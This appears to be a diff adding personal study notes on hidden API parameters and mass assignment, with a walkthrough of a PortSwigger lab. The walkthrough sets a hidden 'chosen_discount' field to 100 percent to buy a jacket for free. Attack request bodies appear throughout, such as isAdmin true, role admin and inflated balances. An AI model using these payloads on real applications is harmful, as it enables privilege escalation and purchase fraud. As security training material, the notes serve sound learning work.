@@ -1149,3 +1149,953 @@ First verify:
 Many PortSwigger labs intentionally rely on error messages to guide you toward constructing a valid request.
 
 ---
+
+# Finding Hidden Parameters
+
+During API reconnaissance, you may discover parameters that are not documented or visible in the application's user interface.
+
+These hidden parameters may:
+
+- Expose additional functionality
+- Reveal internal object fields
+- Enable privilege escalation
+- Lead to Mass Assignment vulnerabilities
+
+---
+
+## Why Hidden Parameters Exist
+
+Developers often expose only a subset of an object's fields through the user interface.
+
+Example user profile:
+
+```json
+{
+  "username": "wiener",
+  "email": "wiener@example.com"
+}
+```
+
+Actual backend object:
+
+```json
+{
+  "id": 123,
+  "username": "wiener",
+  "email": "wiener@example.com",
+  "isAdmin": false,
+  "accountBalance": 500,
+  "role": "user",
+  "isVerified": true
+}
+```
+
+Although the UI only displays username and email, the API may still process additional fields.
+
+---
+
+# Discovering Hidden Parameters
+
+## 1. Burp Intruder
+
+Use Intruder to add or replace parameters with common names.
+
+Examples:
+
+```text
+id
+role
+admin
+isAdmin
+verified
+price
+discount
+balance
+permissions
+accessLevel
+```
+
+Observe differences in:
+
+- Response codes
+- Response lengths
+- Error messages
+- Application behavior
+
+---
+
+## 2. Param Miner
+
+Param Miner can automatically guess thousands of parameter names.
+
+Benefits:
+
+- Fast enumeration
+- Context-aware guessing
+- Useful for undocumented APIs
+
+Can discover:
+
+```text
+isAdmin
+debug
+internal
+accessLevel
+role
+```
+
+that are not visible in normal requests.
+
+---
+
+## 3. Content Discovery
+
+Content Discovery can identify:
+
+- Hidden endpoints
+- Hidden directories
+- Hidden parameters
+
+These may reveal additional API functionality.
+
+---
+
+# Mass Assignment Vulnerabilities
+
+## Definition
+
+Mass Assignment (Auto-Binding) occurs when a framework automatically maps user-supplied parameters directly onto an internal object.
+
+Instead of explicitly selecting allowed fields, the application blindly updates any matching field names supplied by the user.
+
+---
+
+## Conceptual Example
+
+Suppose the application contains this internal user object:
+
+```json
+{
+  "id": 123,
+  "username": "wiener",
+  "email": "wiener@example.com",
+  "isAdmin": false
+}
+```
+
+The developer intends users to update only:
+
+```json
+{
+  "username": "wiener",
+  "email": "wiener@example.com"
+}
+```
+
+However, the framework automatically maps all incoming parameters to the object.
+
+The attacker sends:
+
+```json
+{
+  "username": "wiener",
+  "email": "wiener@example.com",
+  "isAdmin": true
+}
+```
+
+Result:
+
+```json
+{
+  "id": 123,
+  "username": "wiener",
+  "email": "wiener@example.com",
+  "isAdmin": true
+}
+```
+
+The attacker becomes an administrator.
+
+---
+
+# Why Mass Assignment Happens
+
+Developers often write code similar to:
+
+```python
+user.update(request.json)
+```
+
+or
+
+```javascript
+Object.assign(user, req.body);
+```
+
+or
+
+```ruby
+User.update(params)
+```
+
+Instead of explicitly selecting safe fields.
+
+The framework automatically binds every matching parameter.
+
+---
+
+# Understanding Auto-Binding
+
+Imagine a form:
+
+```json
+{
+  "username": "wiener"
+}
+```
+
+Backend object:
+
+```json
+{
+  "username": "wiener",
+  "role": "user",
+  "isAdmin": false
+}
+```
+
+Framework behavior:
+
+```text
+For every field in request:
+    Find matching object field
+    Copy value into object
+```
+
+This process is called:
+
+```text
+Auto-Binding
+Object Mapping
+Mass Assignment
+```
+
+The framework helps developers write less code but can introduce security vulnerabilities.
+
+---
+
+# Identifying Potential Mass Assignment
+
+A common technique is comparing:
+
+## Update Request
+
+```http
+PATCH /api/users/123
+```
+
+```json
+{
+  "username": "wiener",
+  "email": "wiener@example.com"
+}
+```
+
+---
+
+## Object Retrieval
+
+```http
+GET /api/users/123
+```
+
+```json
+{
+  "id": 123,
+  "username": "wiener",
+  "email": "wiener@example.com",
+  "isAdmin": false,
+  "role": "user"
+}
+```
+
+Potential hidden parameters:
+
+```text
+id
+isAdmin
+role
+```
+
+because they exist on the same object.
+
+---
+
+# Testing for Mass Assignment
+
+## Step 1: Add Hidden Parameter
+
+Original request:
+
+```json
+{
+  "username": "wiener",
+  "email": "wiener@example.com"
+}
+```
+
+Modified request:
+
+```json
+{
+  "username": "wiener",
+  "email": "wiener@example.com",
+  "isAdmin": false
+}
+```
+
+Observe response.
+
+---
+
+## Step 2: Send Invalid Value
+
+```json
+{
+  "username": "wiener",
+  "email": "wiener@example.com",
+  "isAdmin": "foo"
+}
+```
+
+Possible response:
+
+```text
+Invalid boolean value
+```
+
+This is a strong indicator that:
+
+- The parameter exists
+- The application attempted to process it
+
+---
+
+## Step 3: Attempt Exploitation
+
+```json
+{
+  "username": "wiener",
+  "email": "wiener@example.com",
+  "isAdmin": true
+}
+```
+
+If accepted, privilege escalation may occur.
+
+---
+
+# Other Dangerous Hidden Fields
+
+Mass Assignment is not limited to admin privileges.
+
+Examples:
+
+```json
+{
+  "role": "admin"
+}
+```
+
+```json
+{
+  "accountBalance": 1000000
+}
+```
+
+```json
+{
+  "discount": 100
+}
+```
+
+```json
+{
+  "verified": true
+}
+```
+
+```json
+{
+  "subscription": "premium"
+}
+```
+
+```json
+{
+  "credit": 999999
+}
+```
+
+Any sensitive field may become attacker-controlled.
+
+---
+
+# Real-World Example
+
+E-commerce application:
+
+Normal request:
+
+```json
+{
+  "quantity": 1
+}
+```
+
+Retrieved object:
+
+```json
+{
+  "productId": 1,
+  "quantity": 1,
+  "price": 100,
+  "discount": 0
+}
+```
+
+Attacker sends:
+
+```json
+{
+  "quantity": 1,
+  "discount": 100
+}
+```
+
+If the discount field is mass assignable, the item becomes free.
+
+---
+
+# Mass Assignment Recon Methodology
+
+1. Find an update endpoint
+
+```http
+PATCH
+PUT
+POST
+```
+
+2. Find a retrieval endpoint
+
+```http
+GET
+```
+
+3. Compare request fields with returned object fields
+
+4. Enumerate hidden fields
+
+5. Add hidden fields to requests
+
+6. Observe responses and validation errors
+
+7. Attempt privilege escalation or business logic abuse
+
+---
+
+# Common Indicators
+
+Look for:
+
+- Large JSON objects returned by APIs
+- Update endpoints with few visible fields
+- Validation errors mentioning unknown fields
+- Framework-generated error messages
+
+Example:
+
+```text
+Unknown property: isAdmin
+```
+
+or
+
+```text
+Expected boolean value for isAdmin
+```
+
+These often indicate hidden parameters exist.
+
+---
+
+# Lab: Exploiting a Mass Assignment Vulnerability
+
+## Objective
+
+Purchase the Lightweight "l33t" Leather Jacket by exploiting a Mass Assignment vulnerability.
+
+Credentials:
+
+```text
+Username: wiener
+Password: peter
+```
+
+---
+
+# Vulnerability Overview
+
+This lab demonstrates a classic Mass Assignment vulnerability where a hidden object field can be supplied by the client even though it is not present in the original request.
+
+The application trusts user-supplied values and automatically binds them to internal object fields.
+
+---
+
+# Reconnaissance
+
+## Step 1: Add Product to Basket
+
+Add the Lightweight "l33t" Leather Jacket to the shopping cart.
+
+Attempt checkout.
+
+Result:
+
+```text
+Insufficient credit
+```
+
+The item cannot be purchased normally.
+
+---
+
+## Step 2: Analyze Checkout Requests
+
+Observe two API requests:
+
+```http
+GET /api/checkout
+```
+
+and
+
+```http
+POST /api/checkout
+```
+
+---
+
+## Step 3: Compare Request and Response Objects
+
+### POST Request
+
+```json
+{
+  "chosen_products": [
+    {
+      "product_id": "1",
+      "quantity": 1
+    }
+  ]
+}
+```
+
+### GET Response
+
+```json
+{
+  "chosen_discount": {
+    "percentage": 0
+  },
+  "chosen_products": [
+    {
+      "product_id": "1",
+      "quantity": 1
+    }
+  ]
+}
+```
+
+Observation:
+
+The GET response contains an additional field:
+
+```json
+"chosen_discount"
+```
+
+that is not present in the POST request.
+
+This is a strong indicator of a possible hidden parameter.
+
+---
+
+# Hidden Parameter Enumeration
+
+When performing Mass Assignment testing, always compare:
+
+```http
+GET
+```
+
+responses against
+
+```http
+POST
+PUT
+PATCH
+```
+
+requests.
+
+Fields that appear only in responses often belong to the internal object model and may still be writable.
+
+---
+
+# Testing the Hidden Parameter
+
+## Original Request
+
+```json
+{
+  "chosen_products": [
+    {
+      "product_id": "1",
+      "quantity": 1
+    }
+  ]
+}
+```
+
+---
+
+## Modified Request
+
+```json
+{
+  "chosen_discount": {
+    "percentage": 0
+  },
+  "chosen_products": [
+    {
+      "product_id": "1",
+      "quantity": 1
+    }
+  ]
+}
+```
+
+Response:
+
+```text
+Request accepted
+```
+
+Important observation:
+
+The application did not reject the new parameter.
+
+This suggests that the parameter is recognized and processed.
+
+---
+
+# Validation Testing
+
+## Invalid Value Test
+
+Send:
+
+```json
+{
+  "chosen_discount": {
+    "percentage": "x"
+  },
+  "chosen_products": [
+    {
+      "product_id": "1",
+      "quantity": 1
+    }
+  ]
+}
+```
+
+Response:
+
+```text
+Percentage must be a number
+```
+
+This is extremely valuable.
+
+It proves:
+
+- The parameter exists.
+- The server processes it.
+- Validation logic is applied.
+- User input reaches backend code.
+
+---
+
+# Exploitation
+
+Replace:
+
+```json
+{
+  "chosen_discount": {
+    "percentage": 0
+  }
+}
+```
+
+with:
+
+```json
+{
+  "chosen_discount": {
+    "percentage": 100
+  }
+}
+```
+
+Full request:
+
+```json
+{
+  "chosen_discount": {
+    "percentage": 100
+  },
+  "chosen_products": [
+    {
+      "product_id": "1",
+      "quantity": 1
+    }
+  ]
+}
+```
+
+Result:
+
+```text
+100% discount applied
+```
+
+Product price becomes:
+
+```text
+$0.00
+```
+
+Lab solved.
+
+---
+
+# Why This Vulnerability Exists
+
+The application's internal checkout object likely resembles:
+
+```json
+{
+  "chosen_discount": {
+    "percentage": 0
+  },
+  "chosen_products": [
+    {
+      "product_id": "1",
+      "quantity": 1
+    }
+  ]
+}
+```
+
+Developers intended:
+
+```text
+chosen_discount
+```
+
+to be controlled by server-side business logic.
+
+However, Mass Assignment caused user-supplied fields to be automatically bound to the internal object.
+
+As a result:
+
+```json
+{
+  "chosen_discount": {
+    "percentage": 100
+  }
+}
+```
+
+overrides the server's intended value.
+
+---
+
+# Key Indicators Observed
+
+## Hidden Field Appears in GET Response
+
+```json
+{
+  "chosen_discount": {
+    "percentage": 0
+  }
+}
+```
+
+This often indicates a writable internal field.
+
+---
+
+## Added Parameter Does Not Trigger Error
+
+```json
+{
+  "chosen_discount": {
+    "percentage": 0
+  }
+}
+```
+
+suggests the application recognizes the field.
+
+---
+
+## Invalid Value Generates Validation Error
+
+```json
+{
+  "chosen_discount": {
+    "percentage": "x"
+  }
+}
+```
+
+Error:
+
+```text
+Percentage must be a number
+```
+
+This is one of the strongest indicators of Mass Assignment.
+
+The server is validating attacker-controlled input for an undocumented field.
+
+---
+
+# Recon Methodology Learned
+
+When testing APIs:
+
+### 1. Find Update Requests
+
+```http
+POST
+PUT
+PATCH
+```
+
+---
+
+### 2. Find Related GET Requests
+
+```http
+GET
+```
+
+---
+
+### 3. Compare Object Structures
+
+Look for fields that appear only in responses.
+
+Example:
+
+```json
+{
+  "role": "user",
+  "isAdmin": false,
+  "discount": 0,
+  "credit": 100
+}
+```
+
+These are potential hidden parameters.
+
+---
+
+### 4. Add Hidden Fields
+
+Example:
+
+```json
+{
+  "discount": 0
+}
+```
+
+---
+
+### 5. Send Invalid Values
+
+Example:
+
+```json
+{
+  "discount": "abc"
+}
+```
+
+Validation errors often confirm that the parameter is processed.
+
+---
+
+### 6. Attempt Business Logic Manipulation
+
+Examples:
+
+```json
+{
+  "discount": 100
+}
+```
+
+```json
+{
+  "credit": 999999
+}
+```
+
+```json
+{
+  "role": "admin"
+}
+```
+
+```json
+{
+  "isAdmin": true
+}
+```
+
+---
+
+# Lessons Learned
+
+1. Hidden parameters frequently appear in API responses.
+
+2. GET responses often expose internal object structures.
+
+3. Validation errors can confirm whether a hidden field is processed.
+
+4. Mass Assignment occurs when user input is automatically bound to internal object fields.
+
+5. Business logic values such as discounts, balances, roles, and permissions should never be trusted from client input.
+
+6. A field does not need to be documented or visible in the UI to be exploitable.
+
+---
